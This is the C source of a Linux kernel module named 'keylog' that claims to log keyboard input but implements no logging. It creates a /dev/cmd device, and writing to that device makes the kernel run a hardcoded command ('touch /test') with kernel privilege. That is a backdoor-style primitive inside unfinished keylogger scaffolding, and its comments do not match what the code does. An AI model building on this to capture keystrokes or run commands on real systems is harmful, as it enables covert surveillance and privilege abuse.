/* keylog - Creates a device  file that outputs past keyboard input
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/kdev_t.h>
#include <linux/version.h>

#include <asm/uaccess.h>

#define DEV_NAME "cmd"    // Name as it appears in /proc/devices
#define DEVICE_CNT 1

static dev_t dev;
static struct class *cl;
static struct cdev c_dev;

static int Device_Open = 0;

// Fill callback structs
static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static struct file_operations fops = {
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release,
};

/* Called when module is loaded.
 */
static int __init keylog_init(void)
{
    // Register device with kernel, major number dynamically allocated
    int res = alloc_chrdev_region(&dev, 0, DEVICE_CNT, DEV_NAME);
    if (res < 0) {
        printk(KERN_ALERT "chardev: could not register a device\n");
        return res;
    }

    // Initialize struct class
    cl = class_create(THIS_MODULE, DEV_NAME);
    if (!cl) {
        printk(KERN_ALERT "chardev: could not create class\n");
        goto error1;
    }

    // Create device and register with sysfs
    if (device_create(cl, NULL, dev, NULL, DEV_NAME) == NULL) {
        printk(KERN_ALERT "chardev: could not create device\n");
        goto error2;
    }

    // Add the device to the file system
    cdev_init(&c_dev, &fops);
    if (cdev_add(&c_dev, dev, DEVICE_CNT) < 0) {
        printk(KERN_ALERT "chardev: could not create char device on sysfs\n");
        goto error3;
    }

    // Register keyboard notifier
    return 0;
error3:
    device_destroy(cl, dev);
error2:
    class_destroy(cl);
error1:
    unregister_chrdev_region(dev, DEVICE_CNT);
    return -1;
}

/* Called when module is unloaded.
 */
static void __exit keylog_exit(void)
{
    cdev_del(&c_dev);
    device_destroy(cl, dev);
    class_destroy(cl);
    unregister_chrdev_region(dev, DEVICE_CNT);
}

/* Called when a process tries to open the device file.
 * As is "cat /dev/mycharfile"
 */
static int device_open(struct inode *inode, struct file *file)
{
    if (Device_Open)
        return -EBUSY;
    Device_Open++;

    try_module_get(THIS_MODULE);

    return 0;
}

/* Called when a process closes the device file.
 */
static int device_release(struct inode *inode, struct file *file)
{
    Device_Open--;

    module_put(THIS_MODULE);

    return 0;
}

/* Called when a process, which has opened the device file, attempts to read
 * from it.
 */
static ssize_t device_read(struct file *file_ptr, char *buffer,
                           size_t length, loff_t *offset)
{
    printk(KERN_ALERT "Sorry, this operation isn't supported.\n");
    return -EINVAL;
}

/* Called when a process tries to write to the device file.
 * As in "echo hi > /dev/chardev"
 */
static ssize_t device_write(struct file* file_ptr, const char *buff,
                            size_t len, loff_t *off)
{
    char *argv[] = { "/usr/bin/touch", "/test", NULL };

    char *envp[4];
    envp[0] = "HOME=/";
    envp[1] = "TERM=linux";
    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
    envp[3] = NULL;

    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    return 0;
}

module_init(keylog_init);
module_exit(keylog_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Christopher Chin");
MODULE_DESCRIPTION("Prints keyboard events");
